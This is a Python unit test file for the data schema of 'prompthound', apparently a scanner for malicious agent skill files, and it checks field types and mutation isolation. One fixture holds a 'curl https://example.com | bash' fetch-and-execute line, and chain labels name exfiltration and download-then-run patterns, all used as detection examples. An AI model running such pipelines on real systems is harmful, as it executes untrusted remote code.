"""Unit tests for prompthound/schema.py.

Verifies:
  - Every dataclass can be instantiated with representative values.
  - Field types match the spec in tech-implementation.md §3.
  - No implicit mutation between fields of different instances (i.e. mutable
    default containers are not shared via class-level defaults).
  - ScanResult fields are independently settable after construction.

These tests intentionally contain NO business logic — they exist to catch
schema regressions before any consuming stage is written, and to document
the expected shape for readers unfamiliar with the codebase.
"""

import copy

from prompthound.schema import (
    ChainFlag,
    CodeBlock,
    FeatureVector,
    ParsedSkill,
    RiskScore,
    RuleHit,
    ScanResult,
)

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def make_code_block(**kwargs) -> CodeBlock:
    defaults = {
        "language": "bash",
        "content": "curl https://example.com | bash",
        "start_line": 10,
        "end_line": 12,
    }
    return CodeBlock(**{**defaults, **kwargs})


def make_parsed_skill(**kwargs) -> ParsedSkill:
    defaults = {
        "path": "/tmp/SKILL.md",
        "raw_bytes": b"---\nname: test\n---\nBody text.",
        "frontmatter": {"name": "test", "capabilities": ["network"]},
        "body_prose": "Body text.",
        "code_blocks": [make_code_block()],
        "unicode_tag_spans": [],
        "parse_ok": True,
        "parse_error": None,
    }
    return ParsedSkill(**{**defaults, **kwargs})


def make_rule_hit(**kwargs) -> RuleHit:
    defaults = {
        "rule_id": "SHELL_PIPE_001",
        "severity": "high",
        "span": (42, 60),
        "message": "curl | bash pipeline detected in bash code block at line 10",
    }
    return RuleHit(**{**defaults, **kwargs})


def make_feature_vector(**kwargs) -> FeatureVector:
    order = [
        "base64_hex_ratio",
        "unicode_tag_count",
        "capability_mismatch_score",
        "url_count",
        "domain_suspicion_score",
        "urgency_phrase_density",
        "padding_ratio",
        "body_entropy",
        "code_prose_ratio",
    ]
    values = {k: 0.0 for k in order}
    values.update({"url_count": 2.0, "body_entropy": 4.32})
    defaults = {"values": values, "order": order}
    return FeatureVector(**{**defaults, **kwargs})


def make_risk_score(**kwargs) -> RiskScore:
    defaults = {
        "score": 0.87,
        "label": "malicious",
        "feature_importances": [
            {"feature": "url_count", "importance": 0.7},
        ],
    }
    return RiskScore(**{**defaults, **kwargs})


def make_chain_flag(**kwargs) -> ChainFlag:
    defaults = {
        "chain_name": "file_read\u2192encode\u2192network_send",
        "steps": [("file_read", 5), ("encode", 18), ("network_send", 34)],
    }
    return ChainFlag(**{**defaults, **kwargs})


def make_scan_result(**kwargs) -> ScanResult:
    parsed = make_parsed_skill()
    defaults = {
        "parsed": parsed,
        "rule_hits": [make_rule_hit()],
        "features": make_feature_vector(),
        "risk": make_risk_score(),
        "chain_flags": [make_chain_flag()],
    }
    return ScanResult(**{**defaults, **kwargs})


# ---------------------------------------------------------------------------
# CodeBlock
# ---------------------------------------------------------------------------


class TestCodeBlock:
    def test_basic_instantiation(self):
        cb = make_code_block()
        assert cb.language == "bash"
        assert "curl" in cb.content
        assert cb.start_line == 10
        assert cb.end_line == 12

    def test_none_language(self):
        cb = make_code_block(language=None)
        assert cb.language is None

    def test_empty_content(self):
        cb = make_code_block(content="")
        assert cb.content == ""

    def test_field_types(self):
        cb = make_code_block()
        assert isinstance(cb.language, str)
        assert isinstance(cb.content, str)
        assert isinstance(cb.start_line, int)
        assert isinstance(cb.end_line, int)

    def test_independent_instances(self):
        """Mutating one instance must not affect another."""
        cb1 = make_code_block(content="echo hello")
        cb2 = make_code_block(content="echo world")
        assert cb1.content != cb2.content


# ---------------------------------------------------------------------------
# ParsedSkill
# ---------------------------------------------------------------------------


class TestParsedSkill:
    def test_basic_instantiation(self):
        ps = make_parsed_skill()
        assert ps.path == "/tmp/SKILL.md"
        assert ps.parse_ok is True
        assert ps.parse_error is None

    def test_raw_bytes_is_bytes(self):
        ps = make_parsed_skill()
        assert isinstance(ps.raw_bytes, bytes)

    def test_frontmatter_is_dict(self):
        ps = make_parsed_skill()
        assert isinstance(ps.frontmatter, dict)
        assert "name" in ps.frontmatter

    def test_code_blocks_is_list_of_code_block(self):
        ps = make_parsed_skill()
        assert isinstance(ps.code_blocks, list)
        assert all(isinstance(cb, CodeBlock) for cb in ps.code_blocks)

    def test_unicode_tag_spans_is_list_of_tuples(self):
        ps = make_parsed_skill(unicode_tag_spans=[(100, 105), (200, 202)])
        assert isinstance(ps.unicode_tag_spans, list)
        for span in ps.unicode_tag_spans:
            assert isinstance(span, tuple)
            assert len(span) == 2

    def test_parse_failed_state(self):
        ps = make_parsed_skill(parse_ok=False, parse_error="No frontmatter found")
        assert ps.parse_ok is False
        assert ps.parse_error == "No frontmatter found"

    def test_independent_frontmatter_dicts(self):
        """Frontmatter dicts of separate instances must not be the same object."""
        ps1 = make_parsed_skill(frontmatter={"name": "skill1"})
        ps2 = make_parsed_skill(frontmatter={"name": "skill2"})
        ps1.frontmatter["injected"] = True
        assert "injected" not in ps2.frontmatter

    def test_independent_code_blocks_lists(self):
        """Appending to one instance's code_blocks must not affect another."""
        ps1 = make_parsed_skill()
        ps2 = make_parsed_skill()
        original_len = len(ps2.code_blocks)
        ps1.code_blocks.append(make_code_block(language="python", start_line=20, end_line=25))
        assert len(ps2.code_blocks) == original_len


# ---------------------------------------------------------------------------
# RuleHit
# ---------------------------------------------------------------------------


class TestRuleHit:
    def test_basic_instantiation(self):
        rh = make_rule_hit()
        assert rh.rule_id == "SHELL_PIPE_001"
        assert rh.severity == "high"
        assert rh.span == (42, 60)
        assert "curl" in rh.message

    def test_valid_severities(self):
        for sev in ("info", "warn", "high"):
            rh = make_rule_hit(severity=sev)
            assert rh.severity == sev

    def test_span_is_tuple_of_two_ints(self):
        rh = make_rule_hit(span=(0, 100))
        assert isinstance(rh.span, tuple)
        assert len(rh.span) == 2
        assert all(isinstance(v, int) for v in rh.span)

    def test_independent_instances(self):
        rh1 = make_rule_hit(rule_id="RULE_A")
        rh2 = make_rule_hit(rule_id="RULE_B")
        assert rh1.rule_id != rh2.rule_id


# ---------------------------------------------------------------------------
# FeatureVector
# ---------------------------------------------------------------------------


class TestFeatureVector:
    def test_basic_instantiation(self):
        fv = make_feature_vector()
        assert isinstance(fv.values, dict)
        assert isinstance(fv.order, list)

    def test_all_expected_features_present(self):
        fv = make_feature_vector()
        expected_features = {
            "base64_hex_ratio",
                "unicode_tag_count",
            "capability_mismatch_score",
            "url_count",
            "domain_suspicion_score",
            "urgency_phrase_density",
            "padding_ratio",
            "body_entropy",
            "code_prose_ratio",
        }
        assert set(fv.order) == expected_features
        assert set(fv.values.keys()) == expected_features

    def test_values_are_floats(self):
        fv = make_feature_vector()
        for key, val in fv.values.items():
            assert isinstance(val, float), f"Feature '{key}' value is not a float: {type(val)}"

    def test_order_and_values_keys_match(self):
        fv = make_feature_vector()
        assert sorted(fv.order) == sorted(fv.values.keys())

    def test_independent_values_dicts(self):
        """Mutating one instance's values dict must not affect another."""
        fv1 = make_feature_vector()
        fv2 = make_feature_vector()
        fv1.values["url_count"] = 999.0
        assert fv2.values["url_count"] != 999.0

    def test_independent_order_lists(self):
        fv1 = make_feature_vector()
        fv2 = make_feature_vector()
        fv1.order.append("__extra__")
        assert "__extra__" not in fv2.order


# ---------------------------------------------------------------------------
# RiskScore
# ---------------------------------------------------------------------------


class TestRiskScore:
    def test_basic_instantiation(self):
        rs = make_risk_score()
        assert 0.0 <= rs.score <= 1.0
        assert rs.label in ("benign", "suspicious", "malicious")

    def test_feature_importances_is_list_of_dicts(self):
        rs = make_risk_score()
        assert isinstance(rs.feature_importances, list)
        for node in rs.feature_importances:
            assert isinstance(node, dict)
            assert "feature" in node
            assert "importance" in node

    def test_empty_feature_importances_valid(self):
        rs = make_risk_score(feature_importances=[])
        assert rs.feature_importances == []

    def test_all_label_values(self):
        for label in ("benign", "suspicious", "malicious"):
            rs = make_risk_score(label=label)
            assert rs.label == label

    def test_score_boundaries(self):
        rs_low = make_risk_score(score=0.0)
        rs_high = make_risk_score(score=1.0)
        assert rs_low.score == 0.0
        assert rs_high.score == 1.0

    def test_independent_feature_importances(self):
        rs1 = make_risk_score()
        rs2 = make_risk_score()
        rs1.feature_importances.append(
            {"feature": "injected", "importance": 0.0}
        )
        # rs2's path must not have grown
        assert not any(n["feature"] == "injected" for n in rs2.feature_importances)


# ---------------------------------------------------------------------------
# ChainFlag
# ---------------------------------------------------------------------------


class TestChainFlag:
    def test_basic_instantiation(self):
        cf = make_chain_flag()
        assert cf.chain_name == "file_read→encode→network_send"
        assert len(cf.steps) == 3

    def test_steps_are_tuples_of_str_and_int(self):
        cf = make_chain_flag()
        for cap, line in cf.steps:
            assert isinstance(cap, str)
            assert isinstance(line, int)

    def test_alternative_chain(self):
        cf = make_chain_flag(
            chain_name="download→write→execute",
            steps=[("download", 3), ("write", 10), ("execute", 22)],
        )
        assert cf.chain_name == "download→write→execute"
        assert cf.steps[2] == ("execute", 22)

    def test_independent_steps_lists(self):
        cf1 = make_chain_flag()
        cf2 = make_chain_flag()
        cf1.steps.append(("extra_step", 99))
        assert ("extra_step", 99) not in cf2.steps


# ---------------------------------------------------------------------------
# ScanResult
# ---------------------------------------------------------------------------


class TestScanResult:
    def test_basic_instantiation(self):
        sr = make_scan_result()
        assert sr.parsed.parse_ok is True
        assert len(sr.rule_hits) == 1
        assert sr.features is not None
        assert sr.risk is not None
        assert len(sr.chain_flags) == 1

    def test_default_mutable_fields_are_not_shared(self):
        """Two ScanResult instances must not share the same default list object.

        This is the critical mutation-isolation test for dataclass fields with
        mutable defaults — using field(default_factory=list) in schema.py
        guarantees each instance gets its own list.
        """
        parsed = make_parsed_skill()
        sr1 = ScanResult(parsed=parsed)
        sr2 = ScanResult(parsed=copy.copy(parsed))

        sr1.rule_hits.append(make_rule_hit())
        assert len(sr2.rule_hits) == 0, (
            "sr2.rule_hits was mutated by appending to sr1.rule_hits — "
            "default_factory=list must be used, not a bare [] default."
        )

    def test_default_chain_flags_not_shared(self):
        parsed = make_parsed_skill()
        sr1 = ScanResult(parsed=parsed)
        sr2 = ScanResult(parsed=copy.copy(parsed))

        sr1.chain_flags.append(make_chain_flag())
        assert len(sr2.chain_flags) == 0

    def test_features_and_risk_default_to_none(self):
        parsed = make_parsed_skill()
        sr = ScanResult(parsed=parsed)
        assert sr.features is None
        assert sr.risk is None

    def test_fields_independently_settable(self):
        """Setting one field must not affect sibling fields."""
        sr = make_scan_result()
        original_risk_score = sr.risk.score
        original_rule_hit_count = len(sr.rule_hits)

        sr.chain_flags = []
        assert sr.risk.score == original_risk_score
        assert len(sr.rule_hits) == original_rule_hit_count

    def test_parse_failed_scan_result(self):
        """A ScanResult for a failed parse has meaningful defaults on other fields."""
        parsed = make_parsed_skill(parse_ok=False, parse_error="Binary garbage")
        sr = ScanResult(parsed=parsed)
        assert sr.parsed.parse_ok is False
        assert sr.rule_hits == []
        assert sr.features is None
        assert sr.risk is None
        assert sr.chain_flags == []

    def test_evidence_types_are_separate_fields(self):
        """The three evidence types (rule hits, risk score, chain flags) must
        be stored as separate fields — never flattened into one list.

        This is the structural enforcement of architecture.md §2.6 and
        AGENTS.md §5 ('Reporter must keep evidence types visibly separate').
        """
        sr = make_scan_result()
        # Each evidence type is accessible on its own field
        assert hasattr(sr, "rule_hits")
        assert hasattr(sr, "risk")
        assert hasattr(sr, "chain_flags")
        # They are of distinct types
        assert isinstance(sr.rule_hits, list)
        assert isinstance(sr.risk, RiskScore)
        assert isinstance(sr.chain_flags, list)
        # rule_hits contains RuleHit objects, not ChainFlag or RiskScore
        assert all(isinstance(h, RuleHit) for h in sr.rule_hits)
        # chain_flags contains ChainFlag objects, not RuleHit or RiskScore
        assert all(isinstance(cf, ChainFlag) for cf in sr.chain_flags)
